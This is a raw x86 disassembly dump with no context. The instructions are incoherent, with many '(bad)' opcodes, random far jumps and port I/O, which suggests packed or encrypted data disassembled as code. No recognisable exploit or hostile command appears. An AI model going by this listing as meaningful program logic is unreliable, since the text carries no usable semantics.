  41d358:	js     0x41d315
  41d35a:	xchg   edx,eax
  41d35b:	xchg   esi,ebp
  41d35d:	mov    dl,BYTE PTR [edx+ecx*8+0x3b]
  41d361:	loopne 0x41d2fa
  41d363:	mov    bl,0x32
  41d365:	add    eax,0xa131e6
  41d36a:	shl    DWORD PTR [ecx-0x658bd8b6],0xf8
  41d371:	stos   BYTE PTR es:[edi],al
  41d372:	loop   0x41d37e
  41d374:	cmp    BYTE PTR [ebx],ch
  41d376:	xchg   edx,eax
  41d377:	mov    dl,0x78
  41d379:	mov    ebx,0xaab88824
  41d37e:	test   al,0x29
  41d380:	ret    
  41d381:	fild   WORD PTR [esi-0x2b75088e]
  41d387:	leave  
  41d388:	cmp    esp,eax
  41d38a:	push   ebx
  41d38b:	hlt    
  41d38c:	xor    ebx,DWORD PTR [eax]
  41d38e:	cwde   
  41d38f:	or     edi,DWORD PTR [ecx-0x55]
  41d392:	xchg   edx,eax
  41d393:	sub    esi,DWORD PTR [edi+edx*1+0x393187]
  41d39a:	inc    ecx
  41d39b:	das    
  41d39c:	mov    ah,0xdf
  41d39e:	jnp    0x41d402
  41d3a0:	push   esp
  41d3a1:	das    
  41d3a2:	lods   al,BYTE PTR ds:[esi]
  41d3a3:	outs   dx,BYTE PTR ds:[esi]
  41d3a4:	shl    DWORD PTR [esi-0x3c851834],0x0
  41d3ab:	add    BYTE PTR [eax],al
  41d3ad:	add    BYTE PTR [eax],al
  41d3af:	inc    ebx
  41d3b0:	mov    esp,0xbe743f70
  41d3b5:	sar    BYTE PTR [esi-0x730cf4f0],0x53
  41d3bc:	(bad)  
  41d3bd:	jmp    0xd603:0xb9a1367b
  41d3c4:	jbe    0x41d3a1
  41d3c6:	imul   esi,DWORD PTR [edi]
  41d3c9:	cmp    BYTE PTR [edi],ch
  41d3cb:	lahf   
  41d3cc:	std    
  41d3cd:	push   cs
  41d3ce:	jge    0x41d437
  41d3d0:	mov    ebp,0x8ec7dc99
  41d3d5:	push   edx
  41d3d6:	jmp    0x638b9e3
  41d3db:	js     0x41d3d9
  41d3dd:	in     eax,dx
  41d3de:	aas    
  41d3df:	mov    edx,0x70259bb1
  41d3e4:	cdq    
  41d3e5:	ds push ds
  41d3e7:	stos   BYTE PTR es:[edi],al
  41d3e8:	(bad)  
  41d3e9:	in     eax,dx
  41d3ea:	xchg   esp,eax
  41d3eb:	iret   
  41d3ec:	cmp    eax,0x58012c1e
  41d3f1:	dec    ecx
  41d3f2:	pop    esp
  41d3f3:	rcl    dh,1
  41d3f5:	push   ss
  41d3f6:	cmp    ebp,edi
  41d3f8:	xor    BYTE PTR [edx],0xed
  41d3fb:	jns    0x41d399
  41d3fd:	inc    ebp
  41d3fe:	add    ebx,ebp
  41d400:	std    
  41d401:	add    ebp,ebp
  41d403:	xor    BYTE PTR [edx+0xe],0x26
  41d407:	or     edi,esi
  41d409:	dec    esp
  41d40a:	push   0xffffffd0
  41d40c:	aam    0xd0
  41d40e:	in     eax,0x93
  41d410:	fs cdq 
  41d412:	js     0x41d414
  41d414:	add    BYTE PTR [eax],al
  41d416:	add    BYTE PTR [eax],al
  41d418:	cmp    eax,0x4c7376b7
  41d41d:	mov    dl,0xf6
  41d41f:	add    esi,DWORD PTR [ebx-0x3]
  41d422:	in     eax,dx
  41d423:	pop    edi
  41d424:	push   eax
  41d425:	(bad)  
  41d426:	push   ss
  41d427:	call   0x37db8bdb
  41d42c:	and    al,0x68
  41d42e:	(bad)  
  41d42f:	jmp    0x9816ffc7
  41d434:	shl    DWORD PTR [eax-0x4b1797f2],1
  41d43a:	psubsw mm2,QWORD PTR [ebx+0x18b74363]
  41d441:	inc    ecx
  41d442:	xor    esi,ecx
  41d444:	xchg   edx,eax
  41d445:	mov    dl,0xe
  41d447:	mov    dh,0x8
  41d449:	fistp  DWORD PTR [ecx-0x13cc8000]
  41d44f:	sub    al,0x7e
  41d451:	xor    cl,dl
  41d453:	add    BYTE PTR [ecx-0x50],bh
  41d456:	ins    DWORD PTR es:[edi],dx
  41d457:	(bad)  
  41d458:	fsincos 
  41d45a:	in     eax,dx
  41d45b:	(bad)  
  41d45c:	jle    0x41d495
  41d45e:	fiadd  WORD PTR [eax]
  41d460:	jns    0x41d412
  41d462:	xchg   ecx,eax
  41d463:	in     eax,dx
  41d464:	lds    esp,FWORD PTR [eax-0x494b48e5]
  41d46a:	(bad)  
  41d46b:	clc    
  41d46c:	imul   ecx,esp,0x15
  41d46f:	adc    DWORD PTR [ecx-0x51],0x1b
  41d473:	test   ebx,eax
  41d475:	scas   eax,DWORD PTR es:[edi]
  41d476:	push   cs
  41d477:	add    dh,dh
  41d479:	mov    ebx,0x1032
  41d47e:	add    BYTE PTR [eax],al
  41d480:	add    BYTE PTR ds:0xb4000eb0,ah
  41d486:	dec    ebp
  41d487:	bound  ecx,QWORD PTR [ebx]
  41d489:	addr16 popa 
  41d48b:	cdq    
  41d48c:	dec    esp
  41d48d:	push   ebp
  41d48e:	cwde   
  41d48f:	test   ah,0xc2
  41d492:	scas   eax,DWORD PTR es:[edi]
  41d493:	push   cs
  41d494:	adc    dl,0xaf
  41d497:	bound  ebx,QWORD PTR [ebx-0x12]
  41d49a:	lea    edx,[esi+0x2]
  41d49d:	pop    esp
  41d49e:	mov    ebp,0xc1a83bc2
  41d4a3:	ds push 0xeafa1
  41d4a9:	shr    DWORD PTR [edi+0x319135eb],cl
  41d4af:	push   edx
  41d4b0:	add    BYTE PTR [esi-0x54],cl
  41d4b3:	data16 adc bh,cl
  41d4b6:	scas   eax,DWORD PTR es:[edi]
  41d4b7:	xchg   edi,eax
  41d4b8:	clc    
  41d4b9:	xor    al,0x46
  41d4bb:	bound  edx,QWORD PTR ds:0x2ef5f632
  41d4c1:	dec    ecx
  41d4c2:	scas   eax,DWORD PTR es:[edi]
  41d4c3:	push   cs
  41d4c4:	xor    edi,DWORD PTR [ecx+0x3e]
  41d4c7:	adc    ebp,DWORD PTR [eax-0x70]
  41d4ca:	(bad)  
  41d4cb:	push   ecx
  41d4cc:	add    BYTE PTR [esi],dh
  41d4ce:	xchg   edx,eax
  41d4cf:	sub    cl,BYTE PTR [eax-0x55]
  41d4d2:	pop    es
  41d4d3:	(bad)  
  41d4d5:	adc    eax,0x1b1c3cfc
  41d4da:	fwait
  41d4db:	xchg   esi,eax
  41d4dc:	enter  0x92f6,0x3a
  41d4e0:	adc    al,0x68
  41d4e2:	fcmove st,st(1)
  41d4e4:	inc    DWORD PTR [eax]
  41d4e6:	add    BYTE PTR [eax],al
  41d4e8:	add    BYTE PTR [eax],al
  41d4ea:	outs   dx,DWORD PTR ds:[esi]
  41d4eb:	sbb    BYTE PTR [ecx+0x10],0xd
  41d4ef:	dec    ecx
  41d4f0:	sub    BYTE PTR [esi],cl
  41d4f2:	or     edx,DWORD PTR [esp+ecx*1]
  41d4f5:	dec    DWORD PTR [edx]
  41d4f7:	inc    esp
  41d4f8:	mov    ds:0x6e3c830f,al
  41d4fd:	les    edi,FWORD PTR [ebx]
  41d4ff:	add    al,0x97
  41d501:	jmp    0x990:0x800ab4c4
  41d508:	adc    cl,BYTE PTR [ebx+0xcc1a7]
  41d50e:	mov    esi,0x86600824
  41d513:	leave  
  41d514:	adc    al,BYTE PTR [ecx-0x3592fab4]
  41d51a:	clc    
  41d51b:	xor    eax,0x9907ff19
  41d520:	inc    edi
  41d521:	push   esi
  41d522:	jmp    ebp
  41d524:	pop    ebp
  41d525:	push   ss
  41d526:	push   eax
  41d527:	or     DWORD PTR [ebp-0x3220633d],edx
  41d52d:	mov    cl,BYTE PTR [edi-0x5]
  41d530:	inc    esp
  41d531:	push   eax
  41d532:	fild   WORD PTR ds:0x950165e
  41d538:	xchg   ebp,eax
  41d539:	ret    
  41d53a:	pushf  
  41d53b:	pusha  
  41d53c:	popa   
  41d53d:	xor    al,dl
  41d53f:	and    eax,DWORD PTR [eax+0x5b]
  41d542:	pop    ebx
  41d543:	mov    dl,dh
  41d545:	pop    es
  41d546:	xchg   ecx,eax
  41d547:	mov    dl,0xf7
  41d549:	add    edx,edx
  41d54b:	mov    ch,0xf7
  41d54d:	push   esi
  41d54e:	add    BYTE PTR [eax],al
  41d550:	add    BYTE PTR [eax],al
  41d552:	add    BYTE PTR [ecx],bl
  41d554:	pop    esi
  41d555:	(bad)  
  41d557:	inc    edx
  41d558:	daa    
  41d559:	movq   QWORD PTR [eax-0x5e],mm1
  41d55d:	lea    ebx,[ebx+0x3f7e1ba]
  41d563:	sbb    DWORD PTR [eax-0x39],esi
  41d566:	jl     0x41d538
  41d568:	mov    ds:0x9ed27e95,al
  41d56d:	pop    ebp
  41d56e:	jge    0x41d540
  41d570:	sahf   
  41d571:	js     0x41d59b
  41d573:	xor    BYTE PTR [edx+0x32f7c408],0xf8
  41d57a:	add    edx,DWORD PTR [eax-0x5bb7a170]
  41d580:	daa    
  41d581:	and    edi,DWORD PTR [ebx+ebx*1]
  41d584:	jbe    0x41d5b5
  41d586:	pop    edx
  41d587:	loopne 0x41d582
  41d589:	ret    0x9e4f
  41d58c:	jb     0x41d585
  41d58e:	imul   bh
  41d590:	nop
  41d591:	pop    esi
  41d592:	or     DWORD PTR [edx-0x7fc97b3a],edi
  41d598:	daa    
  41d599:	cmp    DWORD PTR [edx],ebx
  41d59b:	sar    cl,0xca
  41d59e:	dec    edi
  41d59f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5a0:	jb     0x41d599
  41d5a2:	sbb    eax,0x1a3b27b4
  41d5a7:	push   0xffffffb2
  41d5a9:	pop    es
  41d5aa:	mov    bl,0xa2
  41d5ac:	xchg   edx,eax
  41d5ad:	in     eax,dx
  41d5ae:	inc    ebx
  41d5af:	nop
  41d5b0:	xor    eax,0x5745e734
  41d5b5:	mov    al,ds:0xc5
  41d5ba:	add    BYTE PTR [eax],al
  41d5bc:	xchg   ebx,eax
  41d5bd:	mov    dl,0xa5
  41d5bf:	neg    ch
  41d5c1:	mov    ebx,0x279d39e9
  41d5c6:	mov    edx,0xeaa7f07
  41d5cb:	mov    ebp,0x29916fbf
  41d5d0:	(bad)  
  41d5d1:	mov    ebx,0xc3e79b20
  41d5d6:	into   
  41d5d7:	mov    edi,0xb71049ce
  41d5dc:	(bad)  
  41d5dd:	js     0x41d5d9
  41d5df:	fisttp QWORD PTR [edx+esi*4+0x60e89a0e]
  41d5e6:	cdq    
  41d5e7:	xor    eax,0xe90f9d6f
  41d5ec:	xchg   ebx,eax
  41d5ed:	pop    edi
  41d5ee:	cdq    
  41d5ef:	sub    eax,0xe90fd56f
  41d5f4:	xchg   ebx,eax
  41d5f5:	sub    ecx,ecx
  41d5f7:	jb     0x41d604
  41d5f9:	xor    al,0xee
  41d5fb:	pop    ebp
  41d5fc:	sahf   
  41d5fd:	xor    ebp,esi
  41d5ff:	into   
  41d600:	cwde   
  41d601:	mov    eax,ds:0xeecd9b21
  41d606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d607:	ror    DWORD PTR [ebp+0x3be0eb2],1
  41d60d:	nop
  41d60e:	rol    cl,0x8d
  41d611:	mov    dl,0xe
  41d613:	jo     0x41d5ed
  41d615:	into   
  41d616:	(bad)  
  41d617:	outs   dx,DWORD PTR ds:[esi]
  41d618:	enter  0x2ce,0xda
  41d61c:	fisubr DWORD PTR [ebx]
  41d61e:	push   ebx
  41d61f:	lds    eax,FWORD PTR [eax]
  41d621:	add    BYTE PTR [eax],al
  41d623:	add    BYTE PTR [eax],al
  41d625:	xor    DWORD PTR [ebx],0xffffffee
  41d628:	xchg   BYTE PTR [ecx+0x6319cf6e],dl
  41d62e:	imul   ebx,DWORD PTR [ebx+0x3ed4e82d],0x3274c918
  41d638:	adc    eax,0xe90eb293
  41d63d:	push   0xffffff8d
  41d63f:	xor    bl,BYTE PTR [ecx]
  41d641:	and    DWORD PTR [esi+edi*4-0x6e4dac0c],esp
  41d648:	add    BYTE PTR [ecx-0x4b],dl
  41d64b:	popa   
  41d64c:	and    bl,ah
  41d64e:	mov    ah,0x44
  41d650:	push   ebx
  41d651:	sbb    al,0x42
  41d653:	add    esp,ebx
  41d655:	fdiv   QWORD PTR [esi+ecx*1-0x7b]
  41d659:	jns    0x41d61f
  41d65b:	sbb    eax,0xc6af892b
  41d660:	test   DWORD PTR [edi-0x3d],edi
  41d663:	xchg   DWORD PTR [ebx],esi
  41d665:	imul   esi,DWORD PTR [ecx],0xeeed0fe4
  41d66b:	test   BYTE PTR [edx],0x4b
  41d66e:	hlt    
  41d66f:	dec    edx
  41d670:	pop    esi
  41d671:	and    al,0x67
  41d673:	ins    DWORD PTR es:[edi],dx
  41d674:	les    edx,FWORD PTR [ebp-0x4b]
  41d677:	push   cs
  41d678:	add    BYTE PTR [ebx],bh
  41d67a:	cld    
  41d67b:	in     eax,dx
  41d67c:	push   esp
  41d67d:	loop   0x41d696
  41d67f:	pop    ebp
  41d680:	push   esi
  41d681:	sahf   
  41d682:	jne    0x41d663
  41d684:	mov    eax,DWORD PTR [eax+0x17]
  41d687:	add    bh,bh
  41d689:	add    BYTE PTR [eax],al
  41d68b:	add    BYTE PTR [eax],al
  41d68d:	add    BYTE PTR [esi+esi*8-0x69f9aa68],cl
  41d694:	in     eax,dx
  41d695:	mov    dh,dh
  41d697:	jno    0x41d68f
  41d699:	dec    ebx
  41d69a:	out    0x42,al
  41d69c:	jmp    0x41d622
  41d69e:	stc    
  41d69f:	mov    edi,0xc0ff851a
  41d6a4:	div    BYTE PTR [eax-0x36b39cd8]
  41d6aa:	jmp    0x41d65b
  41d6ac:	push   cs
  41d6ad:	xor    bh,BYTE PTR [ecx]
  41d6af:	pop    ss
  41d6b0:	in     al,0x6a
  41d6b2:	stc    
  41d6b3:	inc    edx
  41d6b4:	bound  esp,QWORD PTR [ecx+esi*8]
  41d6b7:	pop    ebp
  41d6b8:	pop    ebp
  41d6b9:	(bad)  
  41d6ba:	fmul   QWORD PTR [edi]
  41d6bc:	add    al,0x40
  41d6be:	stc    
  41d6bf:	push   es
  41d6c0:	push   edx
  41d6c1:	and    al,0xed
  41d6c3:	mov    dl,0x82
  41d6c5:	rcl    BYTE PTR [eax+0x3e0015cb],0x40
  41d6cc:	imul   esi,esi,0x3a
  41d6cf:	pop    es
  41d6d0:	lgs    ecx,FWORD PTR [edi-0x40afef1d]
  41d6d7:	(bad)  
  41d6d8:	mov    ch,0x12
  41d6da:	push   eax
  41d6db:	or     DWORD PTR [ebx-0x11],ebp
  41d6de:	adc    edx,eax
  41d6e0:	sahf   
  41d6e1:	jae    0x41d74f
  41d6e3:	das    
  41d6e4:	xchg   ebx,eax
  41d6e5:	cmp    al,0x92
  41d6e7:	xor    ebx,DWORD PTR [esi]
  41d6e9:	push   edi
  41d6ea:	sub    bh,cl
  41d6ec:	pop    ecx
  41d6ed:	or     eax,0x5540c1d4
  41d6f2:	add    BYTE PTR [eax],al
  41d6f4:	add    BYTE PTR [eax],al
  41d6f6:	add    dh,bl
  41d6f8:	clc    
  41d6f9:	add    ecx,DWORD PTR [esi+eiz*4+0x49]
  41d6fd:	adc    al,BYTE PTR [ebx+0x55eb7d50]
  41d703:	outs   dx,DWORD PTR ds:[esi]
  41d704:	div    cl
  41d706:	adc    eax,0xcd9109d0
  41d70b:	pop    edi
  41d70c:	shr    BYTE PTR [ecx-0x3b],0xb6
  41d710:	dec    esp
  41d711:	inc    esp
  41d712:	push   cx
  41d714:	dec    ebx
  41d715:	jmp    0x41d767
  41d717:	frstor [eax+0xd74438f]
  41d71d:	inc    edx
  41d71e:	xor    DWORD PTR [edi],esi
  41d720:	mov    al,ds:0x589f4f45
  41d725:	mov    BYTE PTR [eax-0x33f7e7b9],cl
  41d72b:	test   ecx,ecx
  41d72d:	adc    al,BYTE PTR [ebx-0x7ee862b0]
  41d733:	fsubr  DWORD PTR [edi]
  41d735:	mov    bh,BYTE PTR [ebp+0x5e]
  41d738:	test   BYTE PTR [esi],ah
  41d73a:	and    al,0xa0
  41d73c:	xchg   BYTE PTR [ebx+esi*2+0x43c8cc3],ah
  41d743:	xchg   edx,eax
  41d744:	mov    dl,0xca
  41d746:	(bad)  
  41d747:	sbb    BYTE PTR [eax-0x19],ah
  41d74a:	jp     0x41d799
  41d74c:	call   0x7af7:0xb1c25c4f
  41d753:	(bad)  
  41d754:	or     cl,cl
  41d756:	add    BYTE PTR [ebp-0x52],0xc4
  41d75a:	cmp    BYTE PTR [eax],al
  41d75c:	add    BYTE PTR [eax],al
  41d75e:	add    BYTE PTR [eax],al
  41d760:	mov    ebp,DWORD PTR [ebx]
  41d762:	mov    ss,WORD PTR [ebx]
  41d764:	or     DWORD PTR [eax-0x41],ebp
  41d767:	fwait
  41d768:	add    ch,bl
  41d76a:	test   DWORD PTR [ebx],0x3660da19
  41d770:	jl     0x41d79f
  41d772:	push   cs
  41d773:	cmp    edi,eax
  41d775:	sub    al,BYTE PTR [edi+eiz*8+0x19145c9f]
  41d77c:	js     0x41d71e
  41d77e:	mov    bh,0x3
  41d780:	adc    ebp,esp
  41d782:	in     al,0x88
  41d784:	je     0x41d805
  41d786:	retf   0x5c7a
  41d789:	lea    ebx,[esi+0x1e]
  41d78c:	xchg   edx,eax
  41d78d:	or     bh,BYTE PTR [ecx]
  41d78f:	scas   eax,DWORD PTR es:[edi]
  41d790:	pop    esp
  41d791:	div    BYTE PTR [eax-0x4d]
  41d794:	adc    bl,dl
  41d796:	inc    ebx
  41d797:	adc    dl,BYTE PTR [ecx]
  41d799:	cmc    
  41d79a:	aam    0x38
  41d79c:	fwait
  41d79d:	sub    DWORD PTR [ecx-0x675e8db],esp
  41d7a3:	fwait
  41d7a4:	push   0xfffffff5
  41d7a6:	mov    esp,0x610318ae
  41d7ab:	mov    esi,0x3a3f72f
  41d7b0:	nop
  41d7b1:	sub    DWORD PTR [ecx-0x820dd65],esi
  41d7b7:	add    ebx,DWORD PTR [ecx]
  41d7b9:	in     eax,dx
  41d7ba:	xor    eax,0x2e596b4f
  41d7bf:	ret    
  41d7c0:	gs pop ebp
  41d7c2:	push   cs
  41d7c3:	bound  eax,QWORD PTR [eax]
  41d7c5:	add    BYTE PTR [eax],al
  41d7c7:	add    BYTE PTR [eax],al
  41d7c9:	cmp    al,0x8c
  41d7cb:	adc    al,0xde
  41d7cd:	scas   ax,WORD PTR es:[edi]
  41d7cf:	js     0x41d7b9
  41d7d1:	inc    ebx
  41d7d2:	test   DWORD PTR [ebx],0xe727845
  41d7d8:	bound  ebp,QWORD PTR [ebx]
  41d7da:	xor    ebp,esi
  41d7dc:	dec    esi
  41d7dd:	xchg   DWORD PTR [edx+0x74],esi
  41d7e0:	push   0xffffffb5
  41d7e2:	mov    bl,0x78
  41d7e4:	fisttp QWORD PTR [eax+ecx*4-0x2]
  41d7e8:	nop
  41d7e9:	mov    dh,0x71
  41d7eb:	(bad)  
  41d7ec:	cwde   
  41d7ed:	inc    ebp
  41d7ee:	pop    edi
  41d7ef:	in     eax,dx
  41d7f0:	cld    
  41d7f1:	repz mov al,ds:0x3608e94e
  41d7f7:	fs in  al,0x79
  41d7fa:	cmc    
  41d7fb:	inc    esp
  41d7fc:	push   cs
  41d7fd:	test   al,0xca
  41d7ff:	add    al,0xa9
  41d801:	xchg   ebx,eax
  41d802:	xor    edi,ecx
  41d804:	jne    0x41d792
  41d806:	test   DWORD PTR [ebx],0xe729db9
  41d80c:	bound  esp,QWORD PTR [ebx]
  41d80e:	pop    esi
  41d80f:	in     eax,dx
  41d810:	cld    
  41d811:	jae    0x41d7b2
  41d813:	dec    esi
  41d814:	jmp    0x1d45cfde
  41d819:	jle    0x41d88d
  41d81b:	push   cs
  41d81c:	push   0xd
  41d81e:	neg    BYTE PTR [ecx-0x2eab2a52]
  41d824:	push   0xe913acf0
  41d829:	xchg   ebx,eax
  41d82a:	arpl   WORD PTR [ebx+0x16],ax
  41d82d:	add    BYTE PTR [eax],al
  41d82f:	add    BYTE PTR [eax],al
  41d831:	add    BYTE PTR [ecx],ah
  41d833:	or     BYTE PTR [esp+edi*1-0x41],al
  41d837:	sub    DWORD PTR [ebx-0x3b],edx
  41d83a:	(bad)  
  41d83b:	bound  ebx,QWORD PTR [ecx+0x43fc99b3]
  41d841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d842:	pop    eax
  41d843:	into   
  41d844:	xor    al,BYTE PTR [eax]
  41d846:	sti    
  41d847:	mov    al,0xe
  41d849:	add    BYTE PTR [eax+0x702832c2],al
  41d84f:	bound  esi,QWORD PTR [edx]
  41d851:	sub    al,0x7e
  41d853:	popf   
  41d854:	mov    esi,0x8fb13915
  41d859:	clc    
  41d85a:	call   0x6a984323
  41d85f:	ret    0x1432
  41d862:	mov    ecx,0xfc76e079
  41d867:	jns    0x41d8ba
  41d869:	mov    ah,0xb1
  41d86b:	pop    ebx
  41d86c:	jbe    0x41d86e
  41d86e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d86f:	mov    al,0xe
  41d871:	lea    ecx,[ebp+0xa]
  41d874:	push   cs
  41d875:	add    DWORD PTR [ecx+0x20505db0],edi
  41d87b:	push   0x32
  41d87d:	and    BYTE PTR [esi-0x63],bh
  41d880:	retf   0x3915
  41d883:	mov    al,0x97
  41d885:	call   0x7c2f1c84
  41d88a:	sub    al,0x9
  41d88c:	push   0x24
  41d88e:	pop    ecx
  41d88f:	call   0x2032:0x2acc550e
  41d896:	add    BYTE PTR [eax],al
  41d898:	add    BYTE PTR [eax],al
  41d89a:	add    BYTE PTR [eax-0x50],bh
  41d89d:	push   cs
  41d89e:	mov    ebp,DWORD PTR [esi]
  41d8a0:	pusha  
  41d8a1:	sbb    eax,DWORD PTR [edx+esi*1+0x61]
  41d8a5:	jmp    0x41d8bc
  41d8a7:	xchg   ebp,eax
  41d8a8:	pushf  
  41d8a9:	dec    esi
  41d8aa:	add    BYTE PTR [edx+0x772e60eb],dl
  41d8b0:	cwde   
  41d8b1:	push   cs
  41d8b2:	pop    ebp
  41d8b3:	inc    edx
  41d8b4:	mov    esp,0x816b1432
  41d8b9:	inc    eax
  41d8ba:	push   ebp
  41d8bb:	fs jae 0x41d90f
  41d8be:	and    al,0x49
  41d8c0:	pusha  
  41d8c1:	inc    ecx
  41d8c2:	(bad)  
  41d8c3:	nop
  41d8c4:	(bad)
  41d8c7:	xchg   edx,eax
  41d8c8:	or     DWORD PTR [edx],edx
  41d8ca:	add    BYTE PTR [ecx],bl
  41d8cc:	scas   al,BYTE PTR es:[edi]
  41d8cd:	imul   BYTE PTR [ebx]
  41d8cf:	or     DWORD PTR [esi-0x2908d00a],edx
  41d8d5:	rcl    DWORD PTR [edx],0x50
  41d8d8:	or     DWORD PTR [edi-0x6bf16e09],ecx
  41d8de:	pop    ebp
  41d8df:	aas    
  41d8e0:	ss push edi
  41d8e2:	jg     0x41d8b0
  41d8e4:	adc    DWORD PTR ds:0x90c89000,edx
  41d8ea:	jmp    0x41d880
  41d8ec:	or     dl,BYTE PTR [edx]
  41d8ee:	add    BYTE PTR [esi-0x80],ah
  41d8f1:	and    edx,DWORD PTR gs:[edx+ecx*1-0x6fb8ffee]
  41d8f9:	mov    eax,0x8f0a568a
  41d8fe:	test   BYTE PTR [eax],0x0
  41d901:	add    BYTE PTR [eax],al
  41d903:	add    BYTE PTR [eax+0x4],dl
  41d906:	(bad)  
  41d907:	jg     0x41d899
  41d909:	or     DWORD PTR [edx],edx
  41d90b:	push   ecx
  41d90c:	sbb    eax,DWORD PTR [ebp+0x9911bf5]
  41d912:	adc    al,BYTE PTR [ebx+0x53167d5b]
  41d918:	ret    
  41d919:	xchg   edi,eax
  41d91a:	jl     0x41d903
  41d91c:	xchg   ebx,eax
  41d91d:	or     DWORD PTR [edx],edx
  41d91f:	mov    DWORD PTR [ebx-0x2c],edx
  41d922:	lahf   
  41d923:	pop    edx
  41d924:	jmp    0x90426460
  41d929:	or     DWORD PTR [ebx+0x43],ebp
  41d92c:	je     0x41d903
  41d92e:	push   0x53
  41d930:	ins    BYTE PTR es:[edi],dx
  41d931:	(bad)  [ebx]
  41d933:	add    al,0xe7
  41d935:	xchg   BYTE PTR [esi+0x24],cl
  41d938:	jo     0x41d8d3
  41d93a:	imul   ecx,DWORD PTR [ebx+0x74],0xffffffa9
  41d93e:	mov    bh,BYTE PTR [ebx+0x3f7b243]
  41d944:	adc    edi,esp
  41d946:	add    edx,DWORD PTR [ebx]
  41d948:	or     esp,ebp
  41d94a:	mov    dh,0xa4
  41d94c:	xchg   ecx,eax
  41d94d:	bound  ebx,QWORD PTR [eax+esi*2+0x3f6ceb3]
  41d954:	nop
  41d955:	and    eax,0x62b3e034
  41d95a:	(bad)  
  41d95b:	shl    BYTE PTR gs:[ecx-0x48d80909],0x38
  41d963:	(bad)  
  41d965:	and    al,0xbc
  41d967:	fild   WORD PTR [eax]
  41d969:	add    BYTE PTR [eax],al
  41d96b:	add    BYTE PTR [eax],al
  41d96d:	mov    ecx,edi
  41d96f:	ss push esp
  41d971:	cmp    esp,0x6e1b51a5
  41d977:	sbb    esp,esp
  41d979:	dec    edi
  41d97a:	pop    esp
  41d97b:	sub    al,0x11
  41d97d:	loopne 0x41d91b
  41d97f:	mov    bh,0x3
  41d981:	dec    ecx
  41d982:	sub    eax,0x8a7f3138
  41d987:	mov    ds:0xcf29fe2,eax
  41d98c:	adc    DWORD PTR [esp+ebx*4-0x49],ebx
  41d990:	add    edx,DWORD PTR [ecx]
  41d992:	sti    
  41d993:	sbb    al,0x4b
  41d995:	out    0x33,al
  41d997:	cmp    al,0xf8
  41d999:	jle    0x41d98d
  41d99b:	test   ebp,0xac78b28b
  41d9a1:	ins    BYTE PTR es:[edi],dx
  41d9a2:	addr16 jmp 0xb44f:0x63299b7e
  41d9aa:	ret    0x46bf
  41d9ad:	push   esp
  41d9ae:	repnz les edi,FWORD PTR [edi+0xf]
  41d9b2:	push   0xf11141ef
  41d9b7:	div    BYTE PTR ds:0x7e82de2a
  41d9bd:	neg    ch
  41d9bf:	push   cs
  41d9c0:	popf   
  41d9c1:	sar    BYTE PTR [ebx],0xfb
  41d9c4:	inc    ebx
  41d9c5:	(bad)  
  41d9c6:	out    dx,eax
  41d9c7:	arpl   bp,di
  41d9c9:	jge    0x41d97d
  41d9cb:	test   ah,0xea
  41d9ce:	out    dx,al
  41d9cf:	in     eax,dx
  41d9d0:	push   0x0
  41d9d2:	add    BYTE PTR [eax],al
  41d9d4:	add    BYTE PTR [eax],al
  41d9d6:	cmp    ebp,edi
  41d9d8:	(bad)  
  41d9d9:	cmc    
  41d9da:	mov    BYTE PTR [edx+eax*1+0x18],bh
  41d9de:	sahf   
  41d9df:	mov    dl,0x3e
  41d9e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9e2:	push   eax
  41d9e3:	(bad)  
  41d9e4:	mov    gs,ecx
  41d9e6:	xchg   ebx,eax
  41d9e7:	mov    dl,0xed
  41d9e9:	aam    0xbf
  41d9eb:	(bad)  
  41d9ec:	dec    esi
  41d9ed:	jmp    0xe944ce3a
  41d9f2:	inc    ecx
  41d9f3:	cmp    esp,eax
  41d9f5:	push   0xfffffff9
  41d9f7:	out    dx,al
  41d9f8:	(bad)  
  41d9f9:	stc    
  41d9fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9fb:	mov    ah,0x44
  41d9fd:	inc    esi
  41d9fe:	mov    al,ds:0x93a90406
  41da03:	mov    ch,ch
  41da05:	fdiv   QWORD PTR [ebx+0x59e94ec7]
  41da0b:	repz inc ecx
  41da0d:	mov    edi,0x92ff5c42
  41da12:	lea    edi,[ebx]
  41da14:	call   0x166864cb
  41da19:	mov    edx,0xd03efe3
  41da1e:	mov    al,ds:0x43720e72
  41da23:	xor    ch,ch
  41da25:	idiv   BYTE PTR [esi-0x654f8b6d]
  41da2b:	pop    esp
  41da2c:	or     al,BYTE PTR [eax+0x7e]
  41da2f:	ret    0xee46
  41da32:	xchg   edi,eax
  41da33:	cli    
  41da34:	aas    
  41da35:	ds loop 0x41da27
  41da38:	add    ecx,ecx
  41da3a:	add    BYTE PTR [eax],al
  41da3c:	add    BYTE PTR [eax],al
  41da3e:	add    BYTE PTR [edi-0x53fff18e],dl
  41da44:	mul    BYTE PTR [ecx+0xa]
  41da47:	lahf   
  41da48:	sbb    eax,DWORD PTR [ecx]
  41da4a:	and    BYTE PTR [edi+0x75],cl
  41da4d:	push   cs
  41da4e:	add    DWORD PTR [edi],0x1b
  41da51:	dec    ebx
  41da52:	mov    ebp,edi
  41da54:	jnp    0x41da9d
  41da56:	ret    
  41da57:	pop    edi
  41da58:	outs   dx,DWORD PTR ds:[esi]
  41da59:	cld    
  41da5a:	call   0x508f6c
  41da5f:	pop    ds
  41da60:	jb     0x41da94
  41da62:	or     al,ch
  41da64:	mov    al,ds:0x4e278b13
  41da69:	jne    0x41da3d
  41da6b:	stc    
  41da6c:	mov    ah,0x97
  41da6e:	(bad)  
  41da6f:	xchg   edi,eax
  41da70:	clc    
  41da71:	adc    DWORD PTR [eax],eax
  41da73:	pop    ds
  41da74:	outs   dx,BYTE PTR ds:[esi]
  41da75:	cld    
  41da76:	mov    esp,DWORD PTR [edi]
  41da78:	in     eax,dx
  41da79:	rol    BYTE PTR [esi],cl
  41da7b:	in     eax,dx
  41da7c:	outs   dx,BYTE PTR ds:[esi]
  41da7d:	sub    eax,0x622d2c00
  41da82:	or     al,BYTE PTR [edx-0x4b]
  41da85:	pop    ebp
  41da86:	call   FWORD PTR [ecx]
  41da88:	in     eax,dx
  41da89:	mov    fs,WORD PTR [esi-0x4f]
  41da8c:	mov    ah,0xeb
  41da8e:	jbe    0x41da55
  41da90:	sbb    DWORD PTR [ecx],eax
